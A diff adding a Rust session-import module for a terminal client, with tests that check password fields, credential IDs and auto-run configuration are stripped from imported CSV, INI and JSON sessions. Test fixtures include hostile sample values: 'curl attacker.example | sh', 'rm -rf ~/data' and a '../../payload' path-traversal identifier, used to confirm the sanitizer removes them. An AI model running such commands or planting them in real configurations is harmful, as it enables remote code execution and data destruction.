@@ -1,0 +1,1097 @@
+use std::collections::{HashMap, HashSet};
+
+use crate::domain::{
+    console::{parse_console_config, serialize_console_config},
+    session::{QuickConnectTarget, SessionError, SessionFolder, SessionRecord},
+};
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize, uniffi::Record)]
+pub struct ImportSessionPreview {
+    pub name: String,
+    pub folder: Option<String>,
+    pub protocol: String,
+    pub host: String,
+    pub port: u16,
+    pub username: Option<String>,
+    pub private_key_path: Option<String>,
+    pub config_json: Option<String>,
+    pub conflict: bool,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize, uniffi::Record)]
+pub struct ImportPreview {
+    pub sessions: Vec<ImportSessionPreview>,
+    pub warnings: Vec<String>,
+    pub conflict_count: u32,
+    pub ignored_secret_field_count: u32,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize, uniffi::Record)]
+pub struct ImportReport {
+    pub id: String,
+    pub source_type: String,
+    pub source_name: String,
+    pub status: String,
+    pub imported_count: u32,
+    pub skipped_count: u32,
+    pub failed_count: u32,
+    pub issues: Vec<String>,
+    pub created_at: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize, uniffi::Record)]
+pub struct ImportApplyResult {
+    pub report: ImportReport,
+    pub imported_sessions: Vec<crate::domain::session::SessionRecord>,
+}
+
+pub fn preview_csv_import(
+    input: &str,
+    existing_session_names: Vec<String>,
+) -> Result<ImportPreview, SessionError> {
+    let mut lines = input.lines().filter(|line| !line.trim().is_empty());
+    let header_line = lines.next().ok_or(SessionError::InvalidQuickConnect)?;
+    let headers = split_csv_line(header_line);
+    let header_index = headers
+        .iter()
+        .enumerate()
+        .map(|(index, name)| (name.to_ascii_lowercase(), index))
+        .collect::<HashMap<_, _>>();
+    let existing = existing_set(existing_session_names);
+    let mut warnings = Vec::new();
+    let mut sessions = Vec::new();
+    let mut ignored_secret_field_count = 0_u32;
+
+    for (row_index, line) in lines.enumerate() {
+        let values = split_csv_line(line);
+        if value_for(&values, &header_index, "password").is_some() {
+            ignored_secret_field_count += 1;
+            warnings.push(format!(
+                "第 {} 行包含密码字段，已忽略；导入后请在钥匙串中配置凭据",
+                row_index + 2
+            ));
+        }
+
+        let name = required_value(&values, &header_index, "name")?;
+        let host = required_value(&values, &header_index, "host")?;
+        let Some(port) = csv_port_for_row(&values, &header_index, row_index + 2, &mut warnings)
+        else {
+            continue;
+        };
+        let username = value_for(&values, &header_index, "username");
+        let folder = value_for(&values, &header_index, "folder");
+        let private_key_path = value_for(&values, &header_index, "private_key_path");
+        let conflict = existing.contains(&name.to_ascii_lowercase());
+
+        sessions.push(ImportSessionPreview {
+            name,
+            folder,
+            protocol: "ssh".to_string(),
+            host,
+            port,
+            username,
+            private_key_path,
+            config_json: None,
+            conflict,
+        });
+    }
+
+    Ok(preview_from_parts(
+        sessions,
+        warnings,
+        ignored_secret_field_count,
+    ))
+}
+
+pub fn preview_legacy_ini_import(
+    input: &str,
+    existing_session_names: Vec<String>,
+) -> Result<ImportPreview, SessionError> {
+    let existing = existing_set(existing_session_names);
+    let mut warnings = Vec::new();
+    let mut sessions = Vec::new();
+    let mut ignored_secret_field_count = 0_u32;
+
+    for line in input.lines().map(str::trim).filter(|line| !line.is_empty()) {
+        if line.starts_with('[') || line.starts_with('#') || line.starts_with(';') {
+            continue;
+        }
+
+        let Some((raw_name, raw_value)) = line.split_once('=') else {
+            continue;
+        };
+
+        if raw_name.to_ascii_lowercase().contains("password") {
+            ignored_secret_field_count += 1;
+            warnings.push(format!("{raw_name} 包含密码字段，已忽略；不会导入密码"));
+            continue;
+        }
+
+        let Some(parsed_target) = parse_legacy_ini_session_target(raw_value.trim())? else {
+            warnings.push(format!(
+                "{raw_name} 已跳过；当前仅导入 SSH、SFTP、SCP、FTP、Telnet 和 VNC 会话"
+            ));
+            continue;
+        };
+        if parsed_target.ignored_userinfo_secret {
+            ignored_secret_field_count += 1;
+            warnings.push(format!(
+                "{raw_name} 的 URL 用户信息包含密码，已忽略；导入后请在钥匙串中配置凭据"
+            ));
+        }
+        let target = parsed_target.target;
+
+        let (folder, name) = split_folder_name(raw_name.trim());
+        let conflict = existing.contains(&name.to_ascii_lowercase());
+
+        sessions.push(ImportSessionPreview {
+            name,
+            folder,
+            protocol: target.protocol,
+            host: target.host,
+            port: target.port,
+            username: target.username,
+            private_key_path: None,
+            config_json: None,
+            conflict,
+        });
+    }
+
+    Ok(preview_from_parts(
+        sessions,
+        warnings,
+        ignored_secret_field_count,
+    ))
+}
+
+pub fn preview_stacio_json_import(
+    input: &str,
+    existing_session_names: Vec<String>,
+) -> Result<ImportPreview, SessionError> {
+    let bundle = serde_json::from_str::<StacioSessionExportBundle>(input)
+        .map_err(|_| SessionError::InvalidQuickConnect)?;
+    if bundle.format != "stacio.sessions.v1" {
+        return Err(SessionError::InvalidQuickConnect);
+    }
+
+    let existing = existing_set(existing_session_names);
+    let folders_by_id = folder_paths_by_id(&bundle.folders);
+    let mut ignored_advanced_configuration = false;
+    let mut sanitized_or_rejected_console_configuration = false;
+    let sessions = bundle
+        .sessions
+        .into_iter()
+        .filter_map(|session| {
+            let (preview, notice) = stacio_json_preview_session(session, &folders_by_id, &existing);
+            match notice {
+                ImportConfigurationNotice::None => {}
+                ImportConfigurationNotice::Advanced => ignored_advanced_configuration = true,
+                ImportConfigurationNotice::Console => {
+                    sanitized_or_rejected_console_configuration = true
+                }
+            }
+            preview
+        })
+        .collect::<Vec<_>>();
+    let mut warnings = Vec::new();
+    if ignored_advanced_configuration {
+        warnings.push("为安全起见，导入文件中的高级和自动执行配置已忽略，仅保留会话图标；请在导入后检查会话设置。".to_string());
+    }
+    if sanitized_or_rejected_console_configuration {
+        warnings.push("Console 配置已按安全合同规范化，无法验证的 Console 会话已跳过；请在导入后检查设备绑定。".to_string());
+    }
+
+    Ok(preview_from_parts(sessions, warnings, 0))
+}
+
+#[derive(serde::Deserialize)]
+struct StacioSessionExportBundle {
+    format: String,
+    folders: Vec<SessionFolder>,
+    sessions: Vec<StacioSessionExportRecord>,
+}
+
+#[derive(serde::Deserialize)]
+struct StacioSessionExportRecord {
+    #[serde(flatten)]
+    session: SessionRecord,
+    config_json: Option<serde_json::Value>,
+}
+
+fn stacio_json_preview_session(
+    exported: StacioSessionExportRecord,
+    folders_by_id: &HashMap<String, String>,
+    existing: &HashSet<String>,
+) -> (Option<ImportSessionPreview>, ImportConfigurationNotice) {
+    let session = exported.session;
+    let protocol = session.protocol.trim().to_ascii_lowercase();
+    let (config_json, notice) = if protocol == "console" {
+        let (config_json, changed_or_rejected) =
+            validated_console_import_config_json(exported.config_json);
+        (
+            config_json,
+            if changed_or_rejected {
+                ImportConfigurationNotice::Console
+            } else {
+                ImportConfigurationNotice::None
+            },
+        )
+    } else {
+        let (config_json, ignored_configuration) =
+            sanitized_import_config_json(exported.config_json);
+        (
+            config_json,
+            if ignored_configuration {
+                ImportConfigurationNotice::Advanced
+            } else {
+                ImportConfigurationNotice::None
+            },
+        )
+    };
+
+    if protocol == "console" {
+        let name = session.name.trim().to_string();
+        let host = session.host.trim().to_string();
+        if session.port != 0 || name.is_empty() || host.is_empty() || config_json.is_none() {
+            return (None, ImportConfigurationNotice::Console);
+        }
+        return (
+            Some(ImportSessionPreview {
+                conflict: existing.contains(&name.to_ascii_lowercase()),
+                name,
+                folder: session
+                    .folder_id
+                    .as_ref()
+                    .and_then(|folder_id| folders_by_id.get(folder_id).cloned()),
+                protocol,
+                host,
+                port: 0,
+                username: None,
+                private_key_path: None,
+                config_json,
+            }),
+            notice,
+        );
+    }
+
+    if !matches!(
+        protocol.as_str(),
+        "ssh" | "sftp" | "scp" | "ftp" | "telnet" | "vnc"
+    ) {
+        return (None, notice);
+    }
+    let Some(port) = u16::try_from(session.port).ok().filter(|port| *port > 0) else {
+        return (None, notice);
+    };
+    let name = session.name.trim().to_string();
+    let host = session.host.trim().to_string();
+    if name.is_empty() || host.is_empty() {
+        return (None, notice);
+    }
+    (
+        Some(ImportSessionPreview {
+            conflict: existing.contains(&name.to_ascii_lowercase()),
+            name,
+            folder: session
+                .folder_id
+                .as_ref()
+                .and_then(|folder_id| folders_by_id.get(folder_id).cloned()),
+            protocol,
+            host,
+            port,
+            username: session
+                .username
+                .map(|username| username.trim().to_string())
+                .filter(|username| !username.is_empty()),
+            private_key_path: session
+                .private_key_path
+                .map(|path| path.trim().to_string())
+                .filter(|path| !path.is_empty()),
+            config_json,
+        }),
+        notice,
+    )
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ImportConfigurationNotice {
+    None,
+    Advanced,
+    Console,
+}
+
+fn validated_console_import_config_json(
+    exported: Option<serde_json::Value>,
+) -> (Option<String>, bool) {
+    let Some(exported) = exported else {
+        return (None, true);
+    };
+    let parsed = match exported {
+        serde_json::Value::String(value) => {
+            match serde_json::from_str::<serde_json::Value>(&value) {
+                Ok(parsed) => parsed,
+                Err(_) => return (None, true),
+            }
+        }
+        serde_json::Value::Null => return (None, true),
+        value => value,
+    };
+    let Ok(raw) = serde_json::to_string(&parsed) else {
+        return (None, true);
+    };
+    let Ok(config) = parse_console_config(raw) else {
+        return (None, true);
+    };
+    let Ok(serialized) = serialize_console_config(config) else {
+        return (None, true);
+    };
+    let canonical = serde_json::from_str::<serde_json::Value>(&serialized).ok();
+    let changed = canonical.as_ref() != Some(&parsed);
+    (Some(serialized), changed)
+}
+
+fn sanitized_import_config_json(exported: Option<serde_json::Value>) -> (Option<String>, bool) {
+    let Some(exported) = exported else {
+        return (None, false);
+    };
+    let parsed = match exported {
+        serde_json::Value::String(value) => match serde_json::from_str::<serde_json::Value>(&value)
+        {
+            Ok(parsed) => parsed,
+            Err(_) => return (None, true),
+        },
+        serde_json::Value::Null => return (None, false),
+        value => value,
+    };
+    let Some(object) = parsed.as_object() else {
+        return (None, true);
+    };
+
+    let icon_id = object
+        .get("sessionIconID")
+        .and_then(serde_json::Value::as_str)
+        .map(str::trim)
+        .filter(|value| {
+            !value.is_empty()
+                && value.len() <= 64
+                && value
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
+        });
+    let ignored_configuration = object.keys().any(|key| key != "sessionIconID")
+        || (object.contains_key("sessionIconID") && icon_id.is_none());
+    let Some(icon_id) = icon_id else {
+        return (None, ignored_configuration);
+    };
+    let sanitized = serde_json::json!({ "sessionIconID": icon_id });
+    (
+        serde_json::to_string(&sanitized).ok(),
+        ignored_configuration,
+    )
+}
+
+fn folder_paths_by_id(folders: &[SessionFolder]) -> HashMap<String, String> {
+    let folders_by_id = folders
+        .iter()
+        .map(|folder| (folder.id.clone(), folder.clone()))
+        .collect::<HashMap<_, _>>();
+    folders
+        .iter()
+        .filter_map(|folder| {
+            folder_path_for(&folder.id, &folders_by_id, &mut HashSet::new())
+                .map(|path| (folder.id.clone(), path))
+        })
+        .collect()
+}
+
+fn folder_path_for(
+    folder_id: &str,
+    folders_by_id: &HashMap<String, SessionFolder>,
+    visiting: &mut HashSet<String>,
+) -> Option<String> {
+    if !visiting.insert(folder_id.to_string()) {
+        return None;
+    }
+    let folder = folders_by_id.get(folder_id)?;
+    let name = folder.name.trim();
+    if name.is_empty() {
+        return None;
+    }
+    let path = match folder.parent_id.as_ref() {
+        Some(parent_id) => {
+            let parent = folder_path_for(parent_id, folders_by_id, visiting)?;
+            format!("{parent}/{name}")
+        }
+        None => name.to_string(),
+    };
+    visiting.remove(folder_id);
+    Some(path)
+}
+
+fn parse_legacy_ini_session_target(
+    input: &str,
+) -> Result<Option<ParsedLegacyIniTarget>, SessionError> {
+    let trimmed = input.trim();
+    let Some((scheme, target)) = trimmed.split_once("://") else {
+        return Ok(None);
+    };
+    let protocol = scheme.trim().to_ascii_lowercase();
+    let Some(default_port) = default_import_port(&protocol) else {
+        return Ok(None);
+    };
+    let (username, host_port, ignored_userinfo_secret) = match target.rsplit_once('@') {
+        Some((userinfo, rest)) if !userinfo.trim().is_empty() && !rest.trim().is_empty() => {
+            let (username, ignored_secret) = sanitized_url_userinfo(userinfo)?;
+            (username, rest.trim(), ignored_secret)
+        }
+        Some(_) => return Err(SessionError::InvalidQuickConnect),
+        None => (None, target.trim(), false),
+    };
+
+    let (host, port) = match host_port.rsplit_once(':') {
+        Some((host, port_text)) if !host.trim().is_empty() && !port_text.trim().is_empty() => {
+            let port = port_text
+                .parse::<u16>()
+                .map_err(|_| SessionError::InvalidPort)?;
+            (host.trim().to_string(), port)
+        }
+        Some(_) => return Err(SessionError::InvalidQuickConnect),
+        None => (host_port.trim().to_string(), default_port),
+    };
+
+    if host.is_empty() {
+        return Err(SessionError::InvalidQuickConnect);
+    }
+
+    Ok(Some(ParsedLegacyIniTarget {
+        target: QuickConnectTarget {
+            protocol,
+            username,
+            host,
+            port,
+        },
+        ignored_userinfo_secret,
+    }))
+}
+
+struct ParsedLegacyIniTarget {
+    target: QuickConnectTarget,
+    ignored_userinfo_secret: bool,
+}
+
+fn sanitized_url_userinfo(userinfo: &str) -> Result<(Option<String>, bool), SessionError> {
+    let userinfo = userinfo.trim();
+    let (username, ignored_secret) = match userinfo.split_once(':') {
+        Some((username, _password)) => (username.trim(), true),
+        None => (userinfo, false),
+    };
+    if username.is_empty() {
+        return Err(SessionError::InvalidQuickConnect);
+    }
+    Ok((Some(username.to_string()), ignored_secret))
+}
+
+fn default_import_port(protocol: &str) -> Option<u16> {
+    match protocol {
+        "ssh" | "sftp" | "scp" => Some(22),
+        "ftp" => Some(21),
+        "telnet" => Some(23),
+        "vnc" => Some(5900),
+        _ => None,
+    }
+}
+
+fn preview_from_parts(
+    sessions: Vec<ImportSessionPreview>,
+    warnings: Vec<String>,
+    ignored_secret_field_count: u32,
+) -> ImportPreview {
+    let conflict_count = sessions.iter().filter(|session| session.conflict).count() as u32;
+    ImportPreview {
+        sessions,
+        warnings,
+        conflict_count,
+        ignored_secret_field_count,
+    }
+}
+
+fn split_csv_line(line: &str) -> Vec<String> {
+    let mut values = Vec::new();
+    let mut value = String::new();
+    let mut chars = line.chars().peekable();
+    let mut in_quotes = false;
+
+    while let Some(ch) = chars.next() {
+        match ch {
+            '"' if in_quotes && chars.peek() == Some(&'"') => {
+                value.push('"');
+                chars.next();
+            }
+            '"' => {
+                in_quotes = !in_quotes;
+            }
+            ',' if !in_quotes => {
+                values.push(value.trim().to_string());
+                value.clear();
+            }
+            _ => value.push(ch),
+        }
+    }
+    values.push(value.trim().to_string());
+    values
+}
+
+fn existing_set(names: Vec<String>) -> HashSet<String> {
+    names
+        .into_iter()
+        .map(|name| name.trim().to_ascii_lowercase())
+        .filter(|name| !name.is_empty())
+        .collect()
+}
+
+fn value_for(
+    values: &[String],
+    header_index: &HashMap<String, usize>,
+    name: &str,
+) -> Option<String> {
+    let index = *header_index.get(name)?;
+    values
+        .get(index)
+        .map(|value| value.trim().to_string())
+        .filter(|value| !value.is_empty())
+}
+
+fn required_value(
+    values: &[String],
+    header_index: &HashMap<String, usize>,
+    name: &str,
+) -> Result<String, SessionError> {
+    value_for(values, header_index, name).ok_or(SessionError::InvalidQuickConnect)
+}
+
+fn csv_port_for_row(
+    values: &[String],
+    header_index: &HashMap<String, usize>,
+    row_number: usize,
+    warnings: &mut Vec<String>,
+) -> Option<u16> {
+    let Some(port_text) = value_for(values, header_index, "port") else {
+        return Some(22);
+    };
+    match port_text.parse::<u16>() {
+        Ok(port) if port > 0 => Some(port),
+        _ => {
+            warnings.push(format!("第 {row_number} 行端口无效，已跳过"));
+            None
+        }
+    }
+}
+
+fn split_folder_name(raw_name: &str) -> (Option<String>, String) {
+    match raw_name.rsplit_once('/') {
+        Some((folder, name)) if !folder.is_empty() && !name.is_empty() => {
+            (Some(folder.to_string()), name.to_string())
+        }
+        _ => (None, raw_name.to_string()),
+    }
+}
+
+#[cfg(test)]
+mod import_tests {
+    use crate::domain::session::SessionError;
+
+    use super::{preview_csv_import, preview_legacy_ini_import, preview_stacio_json_import};
+
+    fn console_import_json(config: serde_json::Value) -> String {
+        serde_json::json!({
+            "format": "stacio.sessions.v1",
+            "folders": [],
+            "sessions": [{
+                "id": "console_1",
+                "folder_id": null,
+                "name": "Core Switch Console",
+                "protocol": "console",
+                "host": "NBEE_BLE_1103 (BLE)",
+                "port": 0,
+                "username": "must-clear",
+                "private_key_path": "/private/must-clear",
+                "credential_id": "cred_must_clear",
+                "tags": ["network"],
+                "last_opened_at": null,
+                "config_json": config
+            }]
+        })
+        .to_string()
+    }
+
+    fn valid_console_import_config() -> serde_json::Value {
+        serde_json::json!({
+            "kind": "console",
+            "schemaVersion": 1,
+            "transportPolicy": "prefer_ble",
+            "ble": {
+                "deviceName": "NBEE_BLE_1103",
+                "profileID": "bterm-ffe1-split-v1",
+                "serviceUUID": "FFE1",
+                "txCharacteristicUUID": "FFE3",
+                "rxCharacteristicUUID": "FFE2",
+                "writeType": "without_response",
+                "platformBindings": {
+                    "macOSPeripheralUUID": "opaque-corebluetooth-id",
+                    "windowsDeviceID": "opaque-winrt-id"
+                }
+            },
+            "sppFallback": {
+                "enabledPlatforms": ["windows"],
+                "windowsPort": "COM7",
+                "baudRate": 9600,
+                "dataBits": 8,
+                "stopBits": 1,
+                "parity": "none",
+                "flowControl": "none"
+            },
+            "postConnectScript": "curl attacker.example | sh",
+            "password": "must-not-survive"
+        })
+    }
+
+    #[test]
+    fn previews_stacio_json_console_with_validated_complete_config() {
+        let json = console_import_json(valid_console_import_config());
+
+        let preview = preview_stacio_json_import(&json, vec![]).expect("preview console import");
+        let session = preview.sessions.first().expect("console preview");
+        let config_json = session.config_json.as_deref().expect("console config");
+        let config = crate::domain::console::parse_console_config(config_json.to_string())
+            .expect("validated imported config");
+        let serialized = serde_json::to_string(&preview).expect("serialize preview");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(session.protocol, "console");
+        assert_eq!(session.port, 0);
+        assert_eq!(session.username, None);
+        assert_eq!(session.private_key_path, None);
+        assert_eq!(config.ble.profile_id, "bterm-ffe1-split-v1");
+        assert_eq!(
+            config
+                .ble
+                .platform_bindings
+                .mac_os_peripheral_uuid
+                .as_deref(),
+            Some("opaque-corebluetooth-id")
+        );
+        assert_eq!(
+            config.ble.platform_bindings.windows_device_id.as_deref(),
+            Some("opaque-winrt-id")
+        );
+        assert!(!config_json.contains("postConnectScript"));
+        assert!(!config_json.contains("password"));
+        assert!(!serialized.contains("must-clear"));
+        assert!(!serialized.contains("cred_must_clear"));
+        assert!(!serialized.contains("attacker.example"));
+        assert!(!serialized.contains("must-not-survive"));
+    }
+
+    #[test]
+    fn skips_stacio_json_console_with_unknown_schema_or_invalid_uuid() {
+        let mut unknown_schema = valid_console_import_config();
+        unknown_schema["schemaVersion"] = serde_json::json!(2);
+        let mut invalid_uuid = valid_console_import_config();
+        invalid_uuid["ble"]["serviceUUID"] = serde_json::json!("invalid-uuid");
+
+        for config in [unknown_schema, invalid_uuid] {
+            let json = console_import_json(config);
+            let preview =
+                preview_stacio_json_import(&json, vec![]).expect("preview invalid console import");
+
+            assert!(preview.sessions.is_empty());
+            assert_eq!(preview.warnings.len(), 1);
+        }
+    }
+
+    #[test]
+    fn previews_csv_sessions_and_ignores_secret_fields() {
+        let csv = include_str!("../../../tests/fixtures/import/sessions.csv");
+
+        let preview = preview_csv_import(csv, vec!["API Server".to_string()]).expect("preview");
+
+        assert_eq!(preview.sessions.len(), 2);
+        assert_eq!(preview.sessions[0].name, "API Server");
+        assert_eq!(preview.sessions[0].host, "api.example.com");
+        assert_eq!(preview.sessions[0].port, 2222);
+        assert_eq!(preview.sessions[0].username, Some("deploy".to_string()));
+        assert_eq!(
+            preview.sessions[0].private_key_path,
+            Some("~/.ssh/prod".to_string())
+        );
+        assert_eq!(preview.conflict_count, 1);
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("密码字段，已忽略")));
+
+        let serialized = serde_json::to_string(&preview).expect("serialize");
+        assert!(!serialized.contains("do-not-import"));
+    }
+
+    #[test]
+    fn previews_csv_sessions_with_quoted_commas_and_escaped_quotes() {
+        let csv = "name,host,port,username,folder,private_key_path,password\n\
+                   \"API, East\",\"api-east.example.com\",2222,\"deploy\",Production,\"~/.ssh/id_ed25519\",\"do-not-import\"\n\
+                   \"Worker \"\"Blue\"\"\",worker.example.com,22,ops,Lab,,\n";
+
+        let preview = preview_csv_import(csv, vec!["API, East".to_string()]).expect("preview");
+        let serialized = serde_json::to_string(&preview).expect("serialize");
+
+        assert_eq!(preview.sessions.len(), 2);
+        assert_eq!(preview.sessions[0].name, "API, East");
+        assert_eq!(preview.sessions[0].host, "api-east.example.com");
+        assert_eq!(
+            preview.sessions[0].private_key_path,
+            Some("~/.ssh/id_ed25519".to_string())
+        );
+        assert!(preview.sessions[0].conflict);
+        assert_eq!(preview.sessions[1].name, "Worker \"Blue\"");
+        assert_eq!(preview.sessions[1].folder, Some("Lab".to_string()));
+        assert_eq!(preview.ignored_secret_field_count, 1);
+        assert!(!serialized.contains("do-not-import"));
+    }
+
+    #[test]
+    fn previews_csv_skips_rows_with_invalid_ports_instead_of_defaulting_to_ssh() {
+        let csv = "name,host,port,username,folder,private_key_path,password\n\
+                   BadText,bad-text.example.com,abc,deploy,Production,,\n\
+                   TooLarge,too-large.example.com,70000,deploy,Production,,\n\
+                   Worker,worker.example.com,2200,ops,Production,,\n";
+
+        let preview = preview_csv_import(csv, vec![]).expect("preview");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(preview.sessions[0].name, "Worker");
+        assert_eq!(preview.sessions[0].port, 2200);
+        assert_eq!(preview.warnings.len(), 2);
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("第 2 行端口无效，已跳过")));
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("第 3 行端口无效，已跳过")));
+    }
+
+    #[test]
+    fn previews_stacio_json_export_bundle_without_credential_references() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "exported_at": "2026-05-31T00:00:00Z",
+            "folders": [
+                {"id": "folder_prod", "parent_id": null, "name": "Production"}
+            ],
+            "sessions": [
+                {
+                    "id": "session_api",
+                    "folder_id": "folder_prod",
+                    "name": "API",
+                    "protocol": "ssh",
+                    "host": "api.example.com",
+                    "port": 2200,
+                    "username": "deploy",
+                    "private_key_path": "~/.ssh/prod",
+                    "credential_id": "cred_should_not_round_trip",
+                    "tags": ["prod"],
+                    "last_opened_at": "2026-05-31T00:00:00Z"
+                }
+            ]
+        }"#;
+
+        let preview = preview_stacio_json_import(json, vec![]).expect("preview json");
+        let serialized = serde_json::to_string(&preview).expect("serialize");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(preview.sessions[0].name, "API");
+        assert_eq!(preview.sessions[0].folder, Some("Production".to_string()));
+        assert_eq!(preview.sessions[0].protocol, "ssh");
+        assert_eq!(preview.sessions[0].host, "api.example.com");
+        assert_eq!(preview.sessions[0].port, 2200);
+        assert_eq!(preview.sessions[0].username, Some("deploy".to_string()));
+        assert_eq!(
+            preview.sessions[0].private_key_path,
+            Some("~/.ssh/prod".to_string())
+        );
+        assert!(!serialized.contains("cred_should_not_round_trip"));
+        assert!(!serialized.contains("last_opened_at"));
+        assert!(!serialized.contains("password"));
+    }
+
+    #[test]
+    fn previews_stacio_json_accepts_string_or_object_config_and_only_keeps_icon() {
+        for config_json in [
+            r#""{\"sessionIconID\":\"ubuntu\",\"postConnectScript\":\"curl attacker.example | sh\"}""#,
+            r#"{"sessionIconID":"ubuntu","startupCommand":"rm -rf ~/data"}"#,
+        ] {
+            let json = format!(
+                r#"{{
+                    "format": "stacio.sessions.v1",
+                    "folders": [],
+                    "sessions": [{{
+                        "id": "session_api",
+                        "folder_id": null,
+                        "name": "API",
+                        "protocol": "ssh",
+                        "host": "api.example.com",
+                        "port": 22,
+                        "username": "deploy",
+                        "private_key_path": null,
+                        "credential_id": null,
+                        "tags": [],
+                        "last_opened_at": null,
+                        "config_json": {config_json}
+                    }}]
+                }}"#
+            );
+
+            let preview = preview_stacio_json_import(&json, vec![]).expect("preview json");
+            assert_eq!(
+                preview.sessions[0].config_json.as_deref(),
+                Some(r#"{"sessionIconID":"ubuntu"}"#)
+            );
+            assert_eq!(preview.warnings.len(), 1);
+            let serialized = serde_json::to_string(&preview).expect("serialize preview");
+            assert!(!serialized.contains("postConnectScript"));
+            assert!(!serialized.contains("startupCommand"));
+            assert!(!serialized.contains("attacker.example"));
+            assert!(!serialized.contains("rm -rf"));
+        }
+    }
+
+    #[test]
+    fn previews_stacio_json_rejects_unsafe_icon_identifiers() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "folders": [],
+            "sessions": [{
+                "id": "session_api",
+                "folder_id": null,
+                "name": "API",
+                "protocol": "ssh",
+                "host": "api.example.com",
+                "port": 22,
+                "username": null,
+                "private_key_path": null,
+                "credential_id": null,
+                "tags": [],
+                "last_opened_at": null,
+                "config_json": {"sessionIconID":"../../payload","postConnectScript":"echo hidden"}
+            }]
+        }"#;
+
+        let preview = preview_stacio_json_import(json, vec![]).expect("preview json");
+        assert_eq!(preview.sessions[0].config_json, None);
+        assert_eq!(preview.warnings.len(), 1);
+        let serialized = serde_json::to_string(&preview).expect("serialize preview");
+        assert!(!serialized.contains("payload"));
+        assert!(!serialized.contains("echo hidden"));
+    }
+
+    #[test]
+    fn previews_stacio_json_nested_folder_paths() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "exported_at": "2026-05-31T00:00:00Z",
+            "folders": [
+                {"id": "folder_prod", "parent_id": null, "name": "Production"},
+                {"id": "folder_db", "parent_id": "folder_prod", "name": "Database"},
+                {"id": "folder_primary", "parent_id": "folder_db", "name": "Primary"}
+            ],
+            "sessions": [
+                {
+                    "id": "session_db",
+                    "folder_id": "folder_primary",
+                    "name": "Primary DB",
+                    "protocol": "ssh",
+                    "host": "db.example.com",
+                    "port": 22,
+                    "username": "deploy",
+                    "private_key_path": null,
+                    "credential_id": null,
+                    "tags": [],
+                    "last_opened_at": null
+                }
+            ]
+        }"#;
+
+        let preview = preview_stacio_json_import(json, vec![]).expect("preview json");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(
+            preview.sessions[0].folder,
+            Some("Production/Database/Primary".to_string())
+        );
+    }
+
+    #[test]
+    fn previews_stacio_json_marks_existing_names_as_conflicts() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "exported_at": "2026-05-31T00:00:00Z",
+            "folders": [],
+            "sessions": [
+                {
+                    "id": "session_api",
+                    "folder_id": null,
+                    "name": "API",
+                    "protocol": "ssh",
+                    "host": "api.example.com",
+                    "port": 22,
+                    "username": null,
+                    "private_key_path": null,
+                    "credential_id": null,
+                    "tags": [],
+                    "last_opened_at": null
+                }
+            ]
+        }"#;
+
+        let preview =
+            preview_stacio_json_import(json, vec!["api".to_string()]).expect("preview json");
+
+        assert_eq!(preview.sessions.len(), 1);
+        assert_eq!(preview.conflict_count, 1);
+        assert!(preview.sessions[0].conflict);
+    }
+
+    #[test]
+    fn preview_stacio_json_rejects_unknown_format() {
+        let json = r#"{
+            "format": "other.sessions.v1",
+            "folders": [],
+            "sessions": []
+        }"#;
+
+        let error = preview_stacio_json_import(json, vec![]).expect_err("reject unknown format");
+
+        assert_eq!(error, SessionError::InvalidQuickConnect);
+    }
+
+    #[test]
+    fn previews_legacy_ini_ini_like_sessions() {
+        let text = format!(
+            "{}\nProduction/FTP=ftp://files@files.example.com\n\
+             Lab/Telnet=telnet://admin@router.example.com\n\
+             Desktop/VNC=vnc://screen.example.com:5901\n\
+             Desktop/XDMCP=xdmcp://display.example.com",
+            include_str!("../../../tests/fixtures/import/legacy_ini.ini")
+        );
+
+        let preview = preview_legacy_ini_import(&text, vec![]).expect("preview");
+
+        assert_eq!(preview.sessions.len(), 5);
+        assert_eq!(preview.sessions[0].folder, Some("Production".to_string()));
+        assert_eq!(preview.sessions[0].name, "API");
+        assert_eq!(preview.sessions[0].host, "api.example.com");
+        assert_eq!(preview.sessions[0].port, 2222);
+        assert_eq!(preview.sessions[1].port, 22);
+        assert_eq!(preview.sessions[2].protocol, "ftp");
+        assert_eq!(preview.sessions[2].username, Some("files".to_string()));
+        assert_eq!(preview.sessions[2].port, 21);
+        assert_eq!(preview.sessions[3].protocol, "telnet");
+        assert_eq!(preview.sessions[3].port, 23);
+        assert_eq!(preview.sessions[4].protocol, "vnc");
+        assert_eq!(preview.sessions[4].port, 5901);
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("密码字段，已忽略")));
+        assert!(preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("Desktop/XDMCP 已跳过")));
+        assert!(!preview
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("当前仅导入 SSH 会话")));
+    }
+
+    #[test]
+    fn previews_legacy_ini_urls_strip_userinfo_passwords() {
+        let text = "Production/SSH=ssh://deploy:super-secret@api.example.com:2222\n\
+                    Production/FTP=ftp://files:ftp-secret@files.example.com";
+
+        let preview = preview_legacy_ini_import(text, vec![]).expect("preview");
+        let serialized = serde_json::to_string(&preview).expect("serialize");
+
+        assert_eq!(preview.sessions.len(), 2);
+        assert_eq!(preview.sessions[0].protocol, "ssh");
+        assert_eq!(preview.sessions[0].username, Some("deploy".to_string()));
+        assert_eq!(preview.sessions[0].host, "api.example.com");
+        assert_eq!(preview.sessions[0].port, 2222);
+        assert_eq!(preview.sessions[1].protocol, "ftp");
+        assert_eq!(preview.sessions[1].username, Some("files".to_string()));
+        assert_eq!(preview.sessions[1].host, "files.example.com");
